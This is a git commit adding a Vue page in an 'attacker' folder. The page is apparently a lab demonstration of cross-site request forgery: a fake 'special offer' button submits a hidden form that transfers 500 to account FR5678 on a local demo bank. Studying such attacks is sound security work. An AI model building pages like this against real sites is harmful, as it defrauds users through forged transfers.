9b5698c7ccc38b61e843aa476322e52b7e9011b6
Dubois Sabrina <dubois.sabrina84@gmail.com>
2025-07-07 16:02:10 +0200

    Add ui folder as normal directory

---
+++ attacker/ui/src/App.vue
@@ -0,0 +1,32 @@
+<template>
+	<div>
+		<h1>🎉 Special Offer !!!</h1>
+		<p>Don't miss this special offer once a year until TODAY!</p>
+
+		<!-- Formulaire CSRF (attaque silencieuse déguisée) -->
+		<form action="http://localhost:8080/bank/transfer" method="POST">
+			<input type="hidden" name="toAccountNumber" value="FR5678" />
+			<input type="hidden" name="amount" value="500" />
+			<button type="submit">Click here to get 100 €</button>
+		</form>
+	</div>
+</template>
+
+<script setup>
+// pas de logique JS ici
+</script>
+
+<style scoped>
+h1 {
+	color: red;
+	margin-bottom: 10px;
+}
+button {
+	margin-top: 20px;
+	padding: 10px;
+	font-weight: bold;
+	background-color: gold;
+	border: none;
+	cursor: pointer;
+}
+</style>
